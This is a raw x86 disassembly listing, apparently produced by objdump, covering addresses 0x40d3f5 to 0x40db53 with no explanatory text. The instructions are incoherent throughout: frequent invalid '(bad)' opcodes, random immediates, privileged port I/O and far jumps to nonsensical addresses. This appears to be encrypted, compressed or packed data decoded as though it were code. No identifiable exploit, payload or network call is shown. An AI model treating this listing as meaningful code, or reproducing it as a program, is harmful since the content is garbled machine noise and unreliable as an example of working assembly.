  40d3f5:	fld    st(0)
  40d3f7:	jmp    0x40d46f
  40d3f9:	adc    eax,0x9254e165
  40d3fe:	and    BYTE PTR [edi-0x226217a0],0x0
  40d405:	sbb    ebp,DWORD PTR [eax]
  40d407:	in     al,dx
  40d408:	mov    eax,0x1c3efe42
  40d40d:	fldenv [esi-0x2e61be3e]
  40d413:	and    dh,BYTE PTR [eax]
  40d415:	jnp    0x40d477
  40d417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d418:	(bad)  
  40d419:	mov    bh,0x74
  40d41b:	(bad)  
  40d41c:	frstor [ecx-0x6f91f60a]
  40d422:	pop    edi
  40d423:	jns    0x40d43a
  40d425:	or     DWORD PTR [esp+ebx*4+0x5d],esp
  40d429:	mov    eax,0xf59a415f
  40d42e:	icebp  
  40d42f:	dec    ebp
  40d430:	(bad)  
  40d431:	cmp    eax,0xedd12bdb
  40d436:	push   ebx
  40d437:	pusha  
  40d438:	lock push esi
  40d43a:	cmc    
  40d43b:	cwde   
  40d43c:	and    BYTE PTR [edi],bl
  40d43e:	inc    ebp
  40d43f:	pop    ecx
  40d440:	popf   
  40d441:	sbb    ebx,DWORD PTR ds:0x8dda88a3
  40d447:	push   ds
  40d448:	push   eax
  40d449:	dec    ebp
  40d44a:	(bad)  
  40d44c:	adc    BYTE PTR [esi-0x70],cl
  40d44f:	xchg   ebx,eax
  40d450:	mov    ch,0x38
  40d452:	icebp  
  40d453:	pop    ss
  40d454:	sub    DWORD PTR [edx-0x62],edi
  40d457:	dec    BYTE PTR [eax]
  40d459:	mov    BYTE PTR [ebp+0xb28324c],al
  40d45f:	jg     0x40d4bc
  40d461:	adc    dh,0x1
  40d464:	ins    BYTE PTR es:[edi],dx
  40d465:	and    DWORD PTR [edx+0xfe4ff14],edi
  40d46b:	aad    0x53
  40d46d:	fwait
  40d46e:	mov    DWORD PTR [esi+eax*8],esi
  40d471:	ja     0x40d436
  40d473:	and    DWORD PTR [esi+0x59],ebx
  40d476:	push   esp
  40d477:	repnz pop ebp
  40d479:	mov    ds:0xda10df88,al
  40d47e:	dec    edi
  40d47f:	adc    DWORD PTR [ebp+0x7ddbaf90],edx
  40d485:	and    ch,dl
  40d487:	fst    DWORD PTR [eax-0x9]
  40d48a:	not    DWORD PTR [esi-0x33]
  40d48d:	pusha  
  40d48e:	adc    esi,DWORD PTR [edi]
  40d490:	stc    
  40d491:	(bad)
  40d494:	or     al,0xa4
  40d496:	(bad)  
  40d497:	outs   dx,DWORD PTR ds:[esi]
  40d498:	push   ss
  40d499:	mov    al,0xbc
  40d49b:	shr    DWORD PTR [ebp+0x6e],1
  40d49e:	adc    al,0xd3
  40d4a0:	jecxz  0x40d463
  40d4a2:	inc    ebx
  40d4a3:	std    
  40d4a4:	mov    esi,0x74720b0e
  40d4a9:	mov    bl,0x7a
  40d4ab:	cmp    dh,BYTE PTR [edx-0x394dc5cf]
  40d4b1:	(bad)  
  40d4b2:	mov    bl,0xae
  40d4b4:	and    DWORD PTR [esi-0x1628ece4],esp
  40d4ba:	cmc    
  40d4bb:	mov    cl,0x58
  40d4bd:	int3   
  40d4be:	dec    ebp
  40d4bf:	or     eax,0x9a8aa7f
  40d4c4:	cdq    
  40d4c5:	adc    eax,0x527ef760
  40d4ca:	je     0x40d541
  40d4cc:	or     cl,al
  40d4ce:	adc    bl,BYTE PTR ds:0x8039b679
  40d4d4:	and    DWORD PTR [esp+ecx*2-0x5148de31],edx
  40d4db:	popa   
  40d4dc:	dec    ecx
  40d4dd:	in     al,dx
  40d4de:	cmp    al,0xff
  40d4e0:	int3   
  40d4e1:	fist   WORD PTR [eax]
  40d4e3:	ss push ecx
  40d4e5:	jbe    0x40d490
  40d4e7:	add    DWORD PTR [edi+0x79],ebp
  40d4ea:	jno    0x40d4ce
  40d4ec:	outs   dx,DWORD PTR ds:[esi]
  40d4ed:	add    DWORD PTR [ecx],0xe7522260
  40d4f3:	dec    eax
  40d4f4:	rcr    ch,0xa9
  40d4f7:	sbb    bh,al
  40d4f9:	xchg   ebx,eax
  40d4fa:	xlat   BYTE PTR ds:[ebx]
  40d4fb:	fcom   QWORD PTR [eax+0x463195ef]
  40d501:	into   
  40d502:	mov    edi,0x24ef15bf
  40d507:	(bad)  
  40d508:	push   cs
  40d509:	fisttp QWORD PTR [eax]
  40d50b:	mov    BYTE PTR ds:0xc8c355c5,dl
  40d511:	dec    edx
  40d512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d513:	push   cs
  40d514:	sub    cl,BYTE PTR [eax+0x32223cbc]
  40d51a:	dec    esi
  40d51b:	xor    dl,al
  40d51d:	cmp    DWORD PTR [esi-0x61],ebp
  40d520:	(bad)  [ebx]
  40d522:	sub    al,0xbd
  40d524:	aaa    
  40d525:	fisub  DWORD PTR [ecx+0x55d169b8]
  40d52b:	and    edi,edi
  40d52d:	(bad)  
  40d52e:	in     al,0xcc
  40d530:	dec    eax
  40d531:	pop    ds
  40d532:	ss data16 into 
  40d535:	mov    ecx,0x1b42ac60
  40d53a:	loope  0x40d51e
  40d53c:	loopne 0x40d55a
  40d53e:	shl    DWORD PTR [edx],1
  40d540:	mov    edx,?
  40d542:	add    BYTE PTR [esi+0x62],ah
  40d545:	dec    ecx
  40d546:	jae    0x40d4f1
  40d548:	jge    0x40d5be
  40d54a:	jl     0x40d596
  40d54c:	jbe    0x40d528
  40d54e:	leave  
  40d54f:	mov    DWORD PTR [edi+0x6d],eax
  40d552:	fisub  WORD PTR [ebp-0x42b450a8]
  40d558:	push   ss
  40d559:	and    esi,eax
  40d55b:	jnp    0x40d547
  40d55d:	cld    
  40d55e:	sub    BYTE PTR [edi+0x13a0afbd],0x17
  40d565:	jg     0x40d564
  40d567:	clc    
  40d568:	fstp   TBYTE PTR [edi-0x4bc4bca7]
  40d56e:	es aas 
  40d570:	stos   DWORD PTR es:[edi],eax
  40d571:	iret   
  40d572:	(bad)  
  40d573:	adc    al,cl
  40d575:	pop    esi
  40d576:	xchg   DWORD PTR [ebx],ebx
  40d578:	jns    0x40d52d
  40d57a:	sar    BYTE PTR [eax-0x29],0xc4
  40d57e:	stos   BYTE PTR es:[edi],al
  40d57f:	or     bh,dh
  40d581:	out    0x7a,eax
  40d583:	loope  0x40d5a4
  40d585:	lods   al,BYTE PTR ds:[esi]
  40d586:	retf   0x3653
  40d589:	test   al,ch
  40d58b:	ds stc 
  40d58d:	mov    ds:0x59b1dd60,eax
  40d592:	adc    DWORD PTR [ebx+0x7235c34e],ecx
  40d598:	(bad)  
  40d599:	nop
  40d59a:	(bad)  
  40d59b:	cli    
  40d59c:	aad    0x6d
  40d59e:	add    BYTE PTR [edi-0x1822c719],dh
  40d5a4:	mov    ah,0x35
  40d5a6:	stos   DWORD PTR es:[edi],eax
  40d5a7:	test   BYTE PTR [eax+0x3af2919c],ch
  40d5ad:	mov    ebx,DWORD PTR [esi+0x30befcac]
  40d5b3:	push   es
  40d5b4:	and    al,0x57
  40d5b6:	mov    al,0x45
  40d5b8:	push   0x17
  40d5ba:	nop
  40d5bb:	jbe    0x40d637
  40d5bd:	aaa    
  40d5be:	and    ecx,ebx
  40d5c0:	sub    dl,BYTE PTR [ecx+edi*8+0x33]
  40d5c4:	repnz in eax,dx
  40d5c6:	inc    ebp
  40d5c7:	xchg   edi,eax
  40d5c8:	out    dx,eax
  40d5c9:	in     al,0xea
  40d5cb:	mov    ebx,0x122f29d6
  40d5d0:	call   0xffa85eb4
  40d5d5:	mov    fs:0x41d3a74c,eax
  40d5db:	cmp    al,0x75
  40d5dd:	push   es
  40d5de:	jbe    0x40d5bf
  40d5e0:	imul   edx,DWORD PTR [ebp-0x3b],0xfc5cfacf
  40d5e7:	jae    0x40d5bd
  40d5e9:	push   ss
  40d5ea:	ret    
  40d5eb:	lods   al,BYTE PTR ds:[esi]
  40d5ec:	jmp    0xdd8e5c96
  40d5f1:	cld    
  40d5f2:	mov    ds:0x576bf5c7,al
  40d5f7:	pusha  
  40d5f8:	push   cs
  40d5f9:	inc    esp
  40d5fa:	xchg   ecx,eax
  40d5fb:	xchg   ebx,eax
  40d5fc:	mov    eax,0x3801404d
  40d601:	lods   al,BYTE PTR ds:[esi]
  40d602:	ins    BYTE PTR es:[edi],dx
  40d603:	call   0x2e8d0b9a
  40d608:	lds    edi,FWORD PTR [ecx-0x7ec26e6c]
  40d60e:	dec    BYTE PTR [edi-0x736732e]
  40d614:	or     edi,DWORD PTR ds:[ebp-0x5e]
  40d618:	jns    0x40d64c
  40d61a:	arpl   WORD PTR [ecx],bx
  40d61c:	loope  0x40d5da
  40d61e:	sbb    BYTE PTR [ebp+0x35],cl
  40d621:	das    
  40d622:	mov    BYTE PTR [eax],0xfd
  40d625:	stc    
  40d626:	cmp    eax,0x21ca67ea
  40d62b:	les    esi,FWORD PTR [ecx+0x22521d30]
  40d631:	in     al,0x8d
  40d633:	and    ch,BYTE PTR [esi]
  40d635:	mov    eax,ds:0x2521dc69
  40d63a:	lds    esi,FWORD PTR [ecx-0x2]
  40d63d:	loop   0x40d65b
  40d63f:	adc    DWORD PTR [edx+edx*1-0x194b83ed],edi
  40d646:	mov    ebp,0x9ed31f
  40d64b:	xchg   ecx,eax
  40d64c:	sub    eax,0x482eccb7
  40d651:	and    edx,esi
  40d653:	sar    BYTE PTR [edi+ecx*1-0x17],cl
  40d657:	fstp   TBYTE PTR [esi+eax*2]
  40d65a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d65b:	ja     0x40d6d8
  40d65d:	dec    eax
  40d65e:	inc    esp
  40d65f:	push   ss
  40d660:	pop    edx
  40d661:	je     0x40d62b
  40d663:	xchg   edi,eax
  40d664:	mov    ecx,0xef0864a0
  40d669:	inc    ecx
  40d66a:	and    BYTE PTR [ebx],0xf5
  40d66d:	pop    ebp
  40d66e:	shl    BYTE PTR [ebx-0x5f3e42fb],cl
  40d674:	adc    BYTE PTR cs:[eax+0xc],bl
  40d678:	lods   eax,DWORD PTR ds:[esi]
  40d679:	sub    dh,dl
  40d67b:	(bad)  
  40d67c:	sahf   
  40d67d:	mov    cl,BYTE PTR [ecx-0x4a]
  40d680:	fwait
  40d681:	xchg   esi,eax
  40d682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d683:	daa    
  40d684:	cwde   
  40d685:	outs   dx,DWORD PTR ds:[esi]
  40d686:	jl     0x40d6ef
  40d688:	mov    cs,WORD PTR [edi]
  40d68a:	aas    
  40d68b:	loope  0x40d6c2
  40d68d:	push   0x31
  40d68f:	pop    esp
  40d690:	add    DWORD PTR [esi-0x12],edi
  40d693:	out    dx,eax
  40d694:	or     al,0x8b
  40d696:	adc    bh,ch
  40d698:	outs   dx,BYTE PTR ds:[esi]
  40d699:	pusha  
  40d69a:	ins    BYTE PTR es:[edi],dx
  40d69b:	jne    0x40d65b
  40d69d:	test   eax,0x8a65a544
  40d6a2:	push   cs
  40d6a3:	pop    ds
  40d6a4:	stos   BYTE PTR es:[edi],al
  40d6a5:	sub    BYTE PTR [ecx-0x34],ch
  40d6a8:	xor    edx,DWORD PTR ds:0xfce1fd3e
  40d6ae:	or     BYTE PTR [ebx-0x77],0xf3
  40d6b2:	mov    edi,0x9d27f393
  40d6b7:	scas   al,BYTE PTR es:[edi]
  40d6b8:	or     ch,0xaa
  40d6bb:	repz mov eax,0xc9e5448e
  40d6c1:	cmp    ecx,edx
  40d6c3:	ss out 0xd8,al
  40d6c6:	pop    es
  40d6c7:	retf   0xf6e0
  40d6ca:	cwde   
  40d6cb:	nop
  40d6cc:	in     al,0xcb
  40d6ce:	xchg   DWORD PTR [ebx],ebx
  40d6d0:	dec    ebp
  40d6d1:	pop    eax
  40d6d2:	sub    BYTE PTR [eax-0x5e],0xdf
  40d6d6:	(bad)  
  40d6d7:	mov    fs,WORD PTR [ecx+0x51]
  40d6da:	pop    es
  40d6db:	pusha  
  40d6dc:	clc    
  40d6dd:	mov    ah,0x16
  40d6df:	sbb    BYTE PTR [esi+0x1e1550d4],bh
  40d6e5:	jmp    0x9c7:0xfcd96a8c
  40d6ec:	data16 sbb al,0x49
  40d6ef:	fdivr  QWORD PTR [ecx-0x52]
  40d6f2:	jl     0x40d765
  40d6f4:	push   eax
  40d6f5:	pop    esp
  40d6f6:	jl     0x40d695
  40d6f8:	push   0x66
  40d6fa:	imul   ebx,DWORD PTR ds:0x44716662,0x4ddf6f3a
  40d704:	xchg   edi,eax
  40d705:	retf   0x6e7f
  40d708:	jns    0x40d784
  40d70a:	mov    al,0x83
  40d70c:	sbb    ebx,DWORD PTR [ebp+0x28]
  40d70f:	rcr    eax,0x83
  40d712:	(bad)  
  40d713:	jg     0x40d776
  40d715:	daa    
  40d716:	mov    cs,WORD PTR [esi]
  40d718:	ins    BYTE PTR es:[edi],dx
  40d719:	sbb    DWORD PTR [eax-0x501b34],ebx
  40d71f:	ins    BYTE PTR es:[edi],dx
  40d720:	stos   BYTE PTR es:[edi],al
  40d721:	push   edi
  40d722:	mov    ?,ebp
  40d724:	mov    ?,WORD PTR [edx-0x5827bca4]
  40d72a:	xor    al,0x2d
  40d72c:	pop    ds
  40d72d:	push   es
  40d72e:	add    eax,0x53cf543d
  40d733:	jae    0x40d774
  40d735:	and    DWORD PTR [ecx-0x115619e6],edx
  40d73b:	arpl   WORD PTR [ebp-0x6c],sp
  40d73e:	xchg   ebp,eax
  40d73f:	outs   dx,BYTE PTR ds:[esi]
  40d740:	sub    DWORD PTR [esi],esi
  40d742:	sub    eax,0x635a9fe4
  40d747:	stos   DWORD PTR es:[edi],eax
  40d748:	add    al,0xee
  40d74a:	dec    edx
  40d74b:	stos   BYTE PTR es:[edi],al
  40d74c:	jbe    0x40d7a5
  40d74e:	out    0xcc,al
  40d750:	mov    ebx,0x68d5b7a2
  40d755:	dec    edi
  40d756:	adc    eax,0x7d0db339
  40d75b:	dec    ecx
  40d75c:	sub    BYTE PTR [eax-0x1c],dh
  40d75f:	in     ax,dx
  40d761:	adc    ecx,ecx
  40d763:	retf   
  40d764:	aam    0xf0
  40d766:	jl     0x40d772
  40d768:	inc    ecx
  40d769:	dec    edi
  40d76a:	dec    ebx
  40d76b:	xchg   edx,eax
  40d76c:	js     0x40d758
  40d76e:	cli    
  40d76f:	retf   
  40d770:	je     0x40d7b4
  40d772:	jo     0x40d78c
  40d774:	sahf   
  40d775:	mov    bh,0x72
  40d777:	jae    0x40d73b
  40d779:	jne    0x40d7d3
  40d77b:	sbb    eax,0xd73c78ff
  40d780:	fwait
  40d781:	and    esp,DWORD PTR cs:[ebx-0x175f3b8c]
  40d788:	bound  esp,QWORD PTR cs:[esi]
  40d78b:	repz sbb ecx,DWORD PTR [eax-0xca2500e]
  40d792:	add    al,0x2e
  40d794:	fisubr DWORD PTR [esi-0x314d146f]
  40d79a:	add    eax,0x38faa003
  40d79f:	lea    eax,[edx]
  40d7a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7a2:	cmc    
  40d7a3:	push   0x17
  40d7a5:	adc    BYTE PTR [ecx+edi*1-0x57dcfcfd],ch
  40d7ac:	(bad)  
  40d7ad:	cdq    
  40d7ae:	fwait
  40d7af:	xchg   edx,eax
  40d7b0:	add    bh,BYTE PTR [edx]
  40d7b2:	jl     0x40d82d
  40d7b4:	dec    ecx
  40d7b5:	(bad)  
  40d7b6:	jb     0x40d7a7
  40d7b8:	test   eax,0x5fbfff20
  40d7bd:	mov    eax,0xa472d7fd
  40d7c2:	push   edi
  40d7c3:	inc    esi
  40d7c4:	inc    edx
  40d7c5:	aam    0xfa
  40d7c7:	lods   al,BYTE PTR ds:[esi]
  40d7c8:	dec    esi
  40d7c9:	or     al,0xeb
  40d7cb:	sbb    edx,edx
  40d7cd:	sbb    ebp,DWORD PTR [esi+0x58]
  40d7d0:	mov    ebp,0xd3c14563
  40d7d5:	mov    dl,0x32
  40d7d7:	fnsave [edx-0x1d656940]
  40d7dd:	push   esp
  40d7de:	or     BYTE PTR [edi+0x464cbde9],0x79
  40d7e5:	xchg   edx,eax
  40d7e6:	fsubr  DWORD PTR [ebp+0x12]
  40d7e9:	xchg   edi,eax
  40d7ea:	and    al,0x28
  40d7ec:	out    dx,eax
  40d7ed:	mov    dh,0x45
  40d7ef:	and    BYTE PTR [edi+0x5a],dl
  40d7f2:	lods   eax,DWORD PTR gs:[esi]
  40d7f4:	jae    0x40d820
  40d7f6:	adc    bl,dl
  40d7f8:	imul   eax,ecx,0xa0021d1
  40d7fe:	loopne 0x40d7cf
  40d800:	test   DWORD PTR [esi+0x3869bef9],esi
  40d806:	mov    DWORD PTR [ebp+0x1dfd57a3],edi
  40d80c:	popf   
  40d80d:	(bad)  
  40d80e:	jge    0x40d7c5
  40d810:	in     al,0xda
  40d812:	pop    ss
  40d813:	jle    0x40d7b8
  40d815:	shl    DWORD PTR [eax-0x2c376858],0x9e
  40d81c:	mov    edi,?
  40d81e:	xlat   BYTE PTR ds:[ebx]
  40d81f:	in     al,0x33
  40d821:	int    0xe8
  40d823:	fs jbe 0x40d7b9
  40d826:	mov    al,ds:0x67c03b6d
  40d82b:	out    dx,al
  40d82c:	jns    0x40d809
  40d82e:	sub    DWORD PTR [ebx+0x48],0x6e73c431
  40d835:	xor    ebp,DWORD PTR [esi]
  40d837:	imul   edi,ecx,0x1fd80360
  40d83d:	mov    bh,0xec
  40d83f:	jo     0x40d87c
  40d841:	cmp    al,0x3c
  40d843:	rcr    BYTE PTR [esi],cl
  40d845:	add    edi,DWORD PTR [esi+ebp*2+0x49]
  40d849:	dec    ebx
  40d84a:	jne    0x40d860
  40d84c:	jecxz  0x40d863
  40d84e:	pop    ss
  40d84f:	(bad)  
  40d850:	mov    cl,BYTE PTR [edx]
  40d852:	aas    
  40d853:	push   esi
  40d854:	loope  0x40d80d
  40d856:	mul    DWORD PTR [eax+0x68]
  40d859:	(bad)  
  40d85a:	jno    0x40d81d
  40d85c:	pushf  
  40d85d:	cmp    BYTE PTR [eax+0x4d0051cc],dl
  40d863:	pop    esp
  40d864:	icebp  
  40d865:	sub    DWORD PTR [eax+esi*8],esp
  40d868:	pusha  
  40d869:	sub    al,0xb4
  40d86b:	push   0x6684c63d
  40d870:	(bad)  
  40d871:	repnz cmc 
  40d873:	icebp  
  40d874:	outs   dx,BYTE PTR ds:[esi]
  40d875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d876:	and    edi,DWORD PTR [edx+eax*1]
  40d879:	fidivr DWORD PTR [ebx+eiz*2+0x26]
  40d87d:	ret    0x550b
  40d880:	cmp    DWORD PTR [ebp-0x76],edx
  40d883:	add    eax,0x9a77d99a
  40d888:	sar    BYTE PTR [edx-0x6c],0xb4
  40d88c:	stos   BYTE PTR es:[edi],al
  40d88d:	dec    esi
  40d88e:	iret   
  40d88f:	pop    ebp
  40d890:	popf   
  40d891:	push   esi
  40d892:	jb     0x40d84b
  40d894:	add    esp,ebp
  40d896:	xor    dl,BYTE PTR [esi]
  40d898:	in     eax,dx
  40d899:	cmp    esp,DWORD PTR [ebx-0x54]
  40d89c:	dec    ebp
  40d89d:	push   ebx
  40d89e:	jl     0x40d919
  40d8a0:	in     al,dx
  40d8a1:	jmp    0x40d8a2
  40d8a3:	leave  
  40d8a4:	aas    
  40d8a5:	(bad)  
  40d8a6:	lock (bad) 
  40d8a9:	inc    ecx
  40d8aa:	pop    DWORD PTR [edi]
  40d8ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8ad:	jns    0x40d865
  40d8af:	retfw  
  40d8b1:	mov    ds:0x74238ee5,al
  40d8b6:	les    ecx,FWORD PTR [edi-0x76]
  40d8b9:	mov    al,ds:0x5f67b7cc
  40d8be:	not    BYTE PTR [edi-0x19]
  40d8c1:	mov    eax,ds:0x210a2ba8
  40d8c6:	out    0x3,al
  40d8c8:	inc    esi
  40d8c9:	cld    
  40d8ca:	stos   BYTE PTR es:[edi],al
  40d8cb:	inc    BYTE PTR [ecx]
  40d8cd:	jmp    0x3b06:0x74fe6a89
  40d8d4:	add    ch,bh
  40d8d6:	or     eax,0xe4307efb
  40d8db:	add    eax,0x7974a148
  40d8e0:	xchg   BYTE PTR [eax+0x41],bh
  40d8e3:	or     edi,DWORD PTR [esi+0x70e2d557]
  40d8e9:	sbb    dh,BYTE PTR [ebx+0x6a260c2c]
  40d8ef:	imul   edx,DWORD PTR [ebx+0x3b],0xb0aed6c8
  40d8f6:	outs   dx,DWORD PTR ds:[esi]
  40d8f7:	cmp    ah,dh
  40d8f9:	jns    0x40d935
  40d8fb:	out    dx,eax
  40d8fc:	push   esp
  40d8fd:	ret    
  40d8fe:	push   edi
  40d8ff:	ror    DWORD PTR [ebp+0x595032a5],0x94
  40d906:	sub    dh,BYTE PTR [edi]
  40d908:	(bad)  
  40d909:	loopne 0x40d8f7
  40d90b:	js     0x40d945
  40d90d:	mov    ds:0x99b6030b,al
  40d912:	push   eax
  40d913:	es push 0xb600b4d2
  40d919:	dec    esp
  40d91a:	hlt    
  40d91b:	mov    BYTE PTR [ecx+0x6d],bh
  40d91e:	jle    0x40d99b
  40d920:	xor    eax,0xad299349
  40d926:	cmp    BYTE PTR [ebx],bh
  40d928:	leave  
  40d929:	cmp    eax,0xf51cf672
  40d92e:	sahf   
  40d92f:	mov    al,0xac
  40d931:	adc    ecx,esi
  40d933:	add    esi,DWORD PTR [ebx+0x210c1c59]
  40d939:	xor    esp,ecx
  40d93b:	fcmovu st,st(2)
  40d93d:	fsub   st,st(1)
  40d93f:	(bad)  
  40d940:	fld    DWORD PTR [edx]
  40d942:	je     0x40d91a
  40d944:	ss in  al,0x9d
  40d947:	mov    dl,0x34
  40d949:	jmp    0x213a52ef
  40d94e:	sub    DWORD PTR ds:0x48d9d9c4,ebp
  40d954:	shr    dh,1
  40d956:	ret    0x5f93
  40d959:	retf   0x1c8a
  40d95c:	pop    edi
  40d95d:	xor    DWORD PTR [ebx+0x46],edi
  40d960:	jno    0x40d977
  40d962:	scas   al,BYTE PTR es:[edi]
  40d963:	mov    ebp,0x9df27e62
  40d968:	jmp    DWORD PTR ds:0xebdbb899
  40d96e:	test   BYTE PTR [esi-0x7c],dh
  40d971:	clc    
  40d972:	cld    
  40d973:	cmc    
  40d974:	and    al,BYTE PTR gs:[ebx+eax*1]
  40d978:	mov    dh,BYTE PTR [eax-0x37]
  40d97b:	rol    BYTE PTR [ebx],cl
  40d97d:	and    al,0x67
  40d97f:	push   esi
  40d980:	dec    eax
  40d981:	int    0xd5
  40d983:	xchg   edi,eax
  40d984:	rcr    BYTE PTR [eax+0x5],0xc8
  40d988:	mov    ch,0xfa
  40d98a:	or     cl,bh
  40d98c:	adc    eax,DWORD PTR [esi+0x17]
  40d98f:	push   ecx
  40d990:	cmp    BYTE PTR [esi],cl
  40d992:	(bad)  
  40d993:	loop   0x40da0f
  40d995:	adc    esp,DWORD PTR [edi]
  40d997:	cmp    BYTE PTR [ebp-0x69],dh
  40d99a:	add    ah,bl
  40d99c:	mov    DWORD PTR [ebx-0x19689eb1],edi
  40d9a2:	add    DWORD PTR gs:[ebx],edi
  40d9a5:	std    
  40d9a6:	repz call 0x16ad:0xa10a0cbc
  40d9ae:	xchg   edx,eax
  40d9af:	pop    esi
  40d9b0:	test   BYTE PTR [eax+0x259bdf0c],ch
  40d9b6:	(bad)  
  40d9b8:	pop    ss
  40d9b9:	inc    bp
  40d9bb:	lock ror BYTE PTR [ecx],0x16
  40d9bf:	cmp    eax,0xc807e25c
  40d9c4:	ror    DWORD PTR ds:0xd4cd6307,1
  40d9ca:	lahf   
  40d9cb:	stos   DWORD PTR es:[edi],eax
  40d9cc:	ret    0x99f3
  40d9cf:	enter  0x978e,0xe8
  40d9d3:	cwde   
  40d9d4:	dec    ebx
  40d9d5:	jo     0x40da3b
  40d9d7:	(bad)  
  40d9d8:	pop    ecx
  40d9d9:	cmp    al,0x58
  40d9db:	in     eax,0xdc
  40d9dd:	mov    bh,0x58
  40d9df:	push   cs
  40d9e0:	and    edx,eax
  40d9e2:	call   0x83e98edb
  40d9e7:	mov    dh,0xcb
  40d9e9:	xchg   edi,eax
  40d9ea:	inc    ebx
  40d9eb:	dec    edi
  40d9ec:	rcl    DWORD PTR [esi+esi*8-0x2f11408],cl
  40d9f3:	ret    
  40d9f4:	xor    bl,dl
  40d9f6:	imul   edx,eax,0x5d
  40d9f9:	sbb    eax,DWORD PTR [edx+0x761f9d63]
  40d9ff:	retf   0x5ad4
  40da02:	mov    cl,0x83
  40da04:	retf   
  40da05:	cmp    eax,DWORD PTR [edx+esi*4+0x275cd9e0]
  40da0c:	jle    0x40d9aa
  40da0e:	iret   
  40da0f:	mov    al,0xdb
  40da11:	aas    
  40da12:	fisub  WORD PTR [eax+0x3b]
  40da15:	dec    edx
  40da16:	adc    dl,BYTE PTR [esi+edx*1-0x1dc2e70]
  40da1d:	leave  
  40da1e:	neg    DWORD PTR [ecx-0x625cbc5c]
  40da24:	push   edi
  40da25:	enter  0xf1a2,0xa0
  40da29:	jmp    0x81e948c9
  40da2e:	pop    eax
  40da2f:	add    eax,0xfbcae89a
  40da34:	dec    ebp
  40da35:	pop    ds
  40da36:	es clc 
  40da38:	(bad)  
  40da39:	out    0x9c,al
  40da3b:	ds push ecx
  40da3d:	xor    bl,BYTE PTR [esi-0x53]
  40da40:	pop    ebx
  40da41:	inc    eax
  40da42:	ret    0xb6a6
  40da45:	mov    dh,0x82
  40da47:	dec    eax
  40da48:	push   eax
  40da49:	push   edi
  40da4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da4b:	or     BYTE PTR [esi+0x52],dl
  40da4e:	fst    QWORD PTR [ebx-0x6aec896f]
  40da54:	clc    
  40da55:	cmp    edi,DWORD PTR [edi+esi*1]
  40da58:	xor    eax,0x41b564ea
  40da5d:	dec    ebx
  40da5e:	pop    ecx
  40da5f:	out    dx,eax
  40da60:	lahf   
  40da61:	jle    0x40dac7
  40da63:	inc    edi
  40da64:	xchg   ebx,eax
  40da65:	or     ebx,esp
  40da67:	inc    ebp
  40da68:	inc    esp
  40da69:	and    esi,DWORD PTR [edi-0x51495062]
  40da6f:	pop    esp
  40da70:	cmc    
  40da71:	jg     0x40da6d
  40da73:	jb     0x40dac4
  40da75:	dec    esp
  40da76:	jae    0x40daed
  40da78:	push   edi
  40da79:	aam    0x3d
  40da7b:	out    0x3d,eax
  40da7d:	sub    DWORD PTR [ecx+ecx*4+0x169db2ed],esp
  40da84:	mov    ch,0x66
  40da86:	pop    edi
  40da87:	inc    esp
  40da88:	sub    ebx,DWORD PTR [ecx+0x2c]
  40da8b:	je     0x40da28
  40da8d:	(bad)
  40da90:	das    
  40da91:	pop    esp
  40da92:	cmp    ax,0xe1dd
  40da96:	inc    ecx
  40da97:	mov    esp,0x7d1ede8c
  40da9c:	or     al,0x16
  40da9e:	lahf   
  40da9f:	dec    ebp
  40daa0:	add    al,BYTE PTR [edi+esi*4+0xa7e2b11]
  40daa7:	and    ah,BYTE PTR [edi+0x218112af]
  40daad:	mov    ds:0x9a909446,eax
  40dab2:	jecxz  0x40db26
  40dab4:	adc    BYTE PTR [edx],bl
  40dab6:	ret    0x97f7
  40dab9:	cmp    DWORD PTR [eax-0x2b93edf],ebp
  40dabf:	test   BYTE PTR [esi-0x12e3ea60],dl
  40dac5:	pop    edx
  40dac6:	xchg   edx,eax
  40dac7:	inc    ebx
  40dac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dac9:	add    ch,BYTE PTR [edx+edi*4-0x7d]
  40dacd:	ds je  0x40da86
  40dad0:	mov    ch,0xfa
  40dad2:	jg     0x40db30
  40dad4:	idiv   DWORD PTR [edi]
  40dad6:	clc    
  40dad7:	jae    0x40dac0
  40dad9:	jecxz  0x40db32
  40dadb:	add    al,0x91
  40dadd:	std    
  40dade:	mov    bh,0x7f
  40dae0:	test   BYTE PTR [eax-0x31],ch
  40dae3:	dec    edx
  40dae4:	mov    eax,ds:0x2257593b
  40dae9:	ja     0x40db08
  40daeb:	cwde   
  40daec:	push   ecx
  40daed:	pop    es
  40daee:	push   edx
  40daef:	cld    
  40daf0:	ss das 
  40daf2:	into   
  40daf3:	repz loope 0x40dae1
  40daf6:	(bad)  
  40daf7:	(bad)  
  40daf8:	push   edi
  40daf9:	inc    edi
  40dafa:	out    dx,al
  40dafb:	out    dx,eax
  40dafc:	mov    ebx,0xb5ba2070
  40db01:	imul   edx,eax,0x2f4ed566
  40db07:	out    0xa7,al
  40db09:	jmp    0xd58bc931
  40db0e:	dec    ebx
  40db0f:	jno    0x40daeb
  40db11:	outs   dx,DWORD PTR ds:[esi]
  40db12:	in     eax,dx
  40db13:	ins    BYTE PTR es:[edi],dx
  40db14:	ja     0x40db21
  40db16:	fcomp  QWORD PTR [edi-0x4c35ec97]
  40db1c:	aad    0x43
  40db1e:	pop    ss
  40db1f:	in     eax,dx
  40db20:	push   es
  40db21:	xchg   ebp,eax
  40db22:	mul    DWORD PTR [edx-0x743bb7ad]
  40db28:	pop    esp
  40db29:	jmp    0x40db9d
  40db2b:	mov    ebp,0x5e6b9a63
  40db30:	adc    al,0xea
  40db32:	mov    bl,bl
  40db34:	xchg   ebp,eax
  40db35:	repz jge 0x40dac7
  40db38:	add    cl,BYTE PTR ds:0x7129e014
  40db3e:	push   edi
  40db3f:	xchg   ebx,eax
  40db40:	rcl    BYTE PTR [ebx-0x67a525f4],1
  40db46:	sub    ch,cl
  40db48:	jb     0x40db32
  40db4a:	(bad)  
  40db4b:	scas   eax,DWORD PTR es:[edi]
  40db4c:	sbb    ch,BYTE PTR [esi-0x228a5505]
  40db52:	pop    esi
  40db53:	push   ebp
